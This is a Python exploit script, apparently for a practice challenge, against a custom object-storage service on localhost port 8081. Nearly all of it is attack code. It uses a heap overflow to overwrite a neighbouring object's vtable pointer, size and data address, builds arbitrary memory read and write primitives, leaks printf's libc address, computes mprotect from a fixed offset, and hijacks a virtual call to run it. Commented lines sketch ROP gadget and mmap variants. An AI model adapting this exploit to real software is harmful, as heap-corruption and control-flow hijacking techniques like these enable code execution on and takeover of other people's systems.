import socket
import struct
import binascii

# create an INET, STREAMing socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

gHeader = 0x11223344
gObj1Address = 0
gObj2Address = 0
gVirtualFuncAddress = 0
gData1Address = 0
gData2Address = 0


def init():
    # now connect to the web server on port 80 - the normal http port
    s.connect(("127.0.0.1", 8081))

    data = struct.pack('<I', gHeader) #header
    s.sendall(data)
    #First Obj
    data = struct.pack('<I', 0) #Insert
    s.sendall(data)
    data = struct.pack('<I', 16)
    s.sendall(data)
    data = "AAAAAAAA"
    data += "AAAAAAAA"
    s.sendall(data)
    s.recv(4)
    #Second Obj
    data = struct.pack('<I', gHeader) #header
    s.sendall(data)
    data = struct.pack('<I', 0) #Insert
    s.sendall(data)
    data = struct.pack('<I', 16)
    s.sendall(data)
    data = "BBBBBBBB"
    data += "BBBBBBBB"
    s.sendall(data)
    s.recv(4)
#End Of- init()


def getReferenceAddresses():
    #--- HEAP OVERFLOW
    data = struct.pack('<I', 0x11223344)
    s.sendall(data)
    data = struct.pack('<I', 1) #update object
    s.sendall(data)
    data = struct.pack('<I', 0) #object id
    s.sendall(data)
    data = struct.pack('<I', 64) #size 
    s.sendall(data)

    data = "CCCCCCCCCCCCCCCC" #offset to next objext 16
    data += struct.pack('<I', 0)
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 17) 
    data += struct.pack('<I', 0)
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 33) 
    data += struct.pack('<I', 0xAABBCCDD) #next object virtual func address /   FUNC TO EXECUTE
    data += struct.pack('<I', 1) #next object id
    bytesToRead = 40 #The number should divide by 4
    data += struct.pack('<I', bytesToRead) #next object size / 
    s.sendall(data)
    s.recv(4)

    #--- READ
    data = struct.pack('<I', gHeader)
    s.sendall(data)
    data = struct.pack('<I', 2) #read object
    s.sendall(data)
    data = struct.pack('<I', 1) #object id
    s.sendall(data)

    buf = bytearray(bytesToRead)
    view = memoryview(buf)
    s.recv_into(view,bytesToRead)
    s.recv(4)
    #CODE: print( [hex(c) for c in buf] )
    #CODE: print( "-------------------------------------" )
    #CODE: print( [binascii.hexlify(buf[i:i+4]) for i in range(0, len(buf), 4)] )
    #CODE: print( "-------------------------------------")
    byteswapped = bytearray(len(buf))
    byteswapped[0::4] = buf[3::4]
    byteswapped[1::4] = buf[2::4]
    byteswapped[2::4] = buf[1::4]
    byteswapped[3::4] = buf[0::4]
    print( [binascii.hexlify(byteswapped[i:i+4]) for i in range(0, len(byteswapped), 4)] )
    print( "---" )
    global gObj1Address
    gObj1Address = int(binascii.hexlify(byteswapped[32:36]), 16)
    global gObj2Address
    gObj2Address = int(binascii.hexlify(byteswapped[36:40]), 16)
    tempByteArr = readFromAddress(gObj1Address, 4)
    global gVirtualFuncAddress
    gVirtualFuncAddress = int(binascii.hexlify(tempByteArr), 16)
    print( "gObj1Address=0x" +  binascii.hexlify(byteswapped[32:36]) +", gObj2Address=0x" + binascii.hexlify(byteswapped[36:40]) + ", gVirtualFuncAddress=0x" + binascii.hexlify(tempByteArr) )
    tempByteArr = readFromAddress(gObj1Address+12,4)
    global gData1Address
    gData1Address =  int(binascii.hexlify(tempByteArr), 16)
    tempByteArr = readFromAddress(gObj2Address+12,4)
    global gData2Address
    gData2Address =  int(binascii.hexlify(tempByteArr), 16)
#End Of- getReferenceAddresses()


def readFromAddress(address, bytesToRead):
    #--- HEAP OVERFLOW
    data = struct.pack('<I', gHeader)
    s.sendall(data)
    data = struct.pack('<I', 1) #update object
    s.sendall(data)
    data = struct.pack('<I', 0) #object id
    s.sendall(data)
    data = struct.pack('<I', 64) #size 
    s.sendall(data)

    data = "CCCCCCCCCCCCCCCC" #offset to next objext 16
    data += struct.pack('<I', 0)
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 17) 
    data += struct.pack('<I', 0)
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 33) 
    data += struct.pack('<I', gVirtualFuncAddress) #next object virtual func address /   FUNC TO EXECUTE
    data += struct.pack('<I', 1) #next object id
    #CODE: bytesToRead = 52 #The number should divide by 4
    data += struct.pack('<I', bytesToRead) #next object size /                           HOW MUCH TO READ FROM MEMORY
    data += struct.pack('<I', address) #next obj data address /              MEMORY ADDRESS TO READ / MODIFY
    s.sendall(data)
    s.recv(4)

    #--- READ
    data = struct.pack('<I', 0x11223344)
    s.sendall(data)
    data = struct.pack('<I', 2) #read object
    s.sendall(data)
    data = struct.pack('<I', 1) #object id
    s.sendall(data)

    buf = bytearray(bytesToRead)
    view = memoryview(buf)
    s.recv_into(view,bytesToRead)
    s.recv(4)
    #CODE: print( [hex(c) for c in buf] )
    #CODE: print( "-------------------------------------" )
    #CODE: print( [binascii.hexlify(buf[i:i+4]) for i in range(0, len(buf), 4)] )
    #CODE: print( "-------------------------------------")
    byteswapped = bytearray(len(buf))
    byteswapped[0::4] = buf[3::4]
    byteswapped[1::4] = buf[2::4]
    byteswapped[2::4] = buf[1::4]
    byteswapped[3::4] = buf[0::4]
    print( [binascii.hexlify(byteswapped[i:i+4]) for i in range(0, len(byteswapped), 4)] )
    return byteswapped
#End Of- readFromAddress(address, bytesToRead)    


def writeToAddress(address, buf,bytesToWrite):
    #--- HEAP OVERFLOW
    data = struct.pack('<I', gHeader)
    s.sendall(data)
    data = struct.pack('<I', 1) #update object
    s.sendall(data)
    data = struct.pack('<I', 0) #object id
    s.sendall(data)
    data = struct.pack('<I', 64) #size 
    s.sendall(data)

    data = "CCCCCCCCCCCCCCCC" #offset to next objext 16
    data += struct.pack('<I', 0)
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 17) 
    data += struct.pack('<I', 0)
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 33) 
    data += struct.pack('<I', gVirtualFuncAddress) #next object virtual func address /   FUNC TO EXECUTE
    data += struct.pack('<I', 1) #next object id
    #CODE: bytesToRead = 52 #The number should divide by 4
    data += struct.pack('<I', bytesToWrite) #next object size /                           HOW MUCH TO READ FROM MEMORY
    data += struct.pack('<I', address) #next obj data address /              MEMORY ADDRESS TO READ / MODIFY
    s.sendall(data)
    s.recv(4)

    #---Write
    data = struct.pack('<I', gHeader)
    s.sendall(data)
    data = struct.pack('<I', 1) #update object
    s.sendall(data)
    data = struct.pack('<I', 1) #object id
    s.sendall(data)
    data = struct.pack('<I', bytesToWrite) #size 
    s.sendall(data)

    s.sendall(buf)
    s.recv(4)
#End Of- writeToAddress(address, buf,bytesToWrite)


def executeFunc(address):
    #--- HEAP OVERFLOW
    data = struct.pack('<I', gHeader)
    s.sendall(data)
    data = struct.pack('<I', 1) #update object
    s.sendall(data)
    data = struct.pack('<I', 0) #object id
    s.sendall(data)
    data = struct.pack('<I', 52) #size 
    s.sendall(data)

    data = struct.pack('<I', address) #address to mprotect to use like a vtable
    data += "CCCCCCCCCCCC" #offset to next objext 12
    data += struct.pack('<I', 0)
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 17) 
    data += struct.pack('<I', 0)
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 0) 
    data += struct.pack('<I', 33) 
    data += struct.pack('<I', gData1Address) #next object virtual func address /   ADDRESS OF ADDRESS TO FUNC TO EXECUTE (LIKE VTABLE)
    s.sendall(data)
    s.recv(4)

    #CODE:    tempAddress = struct.pack('<I', address)
    #CODE:    writeToAddress(gVirtualFuncAddress, tempAddress , 4)

    #---Execute
    data = struct.pack('<I', gHeader)
    s.sendall(data)
    data = struct.pack('<I', 3) #print object
    s.sendall(data)
    data = struct.pack('<I', 1) #object id
    s.sendall(data)
    s.recv(4)
#End Of- executeFunc(address)


#--main
init()
getReferenceAddresses()
#0x56559f74 - 0x5655a000 is .got
#virtual func at 0x56559e60

printfAdressBytesArray = readFromAddress(gVirtualFuncAddress+348, 4) # 348 = 0x15c = offset to printf address in the vtable
#vtable at 0x56559fbc -> 0xf7c882d0 printf address
printfAddress = int(binascii.hexlify(printfAdressBytesArray), 16)
print("printfAddress = " + hex(printfAddress))

buf = struct.pack('<I', 0x55555555)
writeToAddress(gObj1Address-4, buf, 4)


#first gadget offset from start 3513 = 0xdb9
#gadget1Address = start + offset  = 0x56555000 + 0xdb9 = 0x56555db9
#gVirtualFuncAddress - gadget1Address = 0x56559e60 - 0x56555db9 = 0x40A7 = 16551
#gVirtualFuncAddress - 16551 = gadget1Address
#CODE: executeFunc(gVirtualFuncAddress - 16551) 

mprotectAddress = printfAddress + 668560 # 668560 = 0xA3390 = offset between printf to mprotect
executeFunc(mprotectAddress)

#CODE: mmapAddress = printfAddress + 668288 # 668288 = 0xA3280 = offset between printf to mmap
#CODE: executeFunc(mmapAddress)

s.recv(4)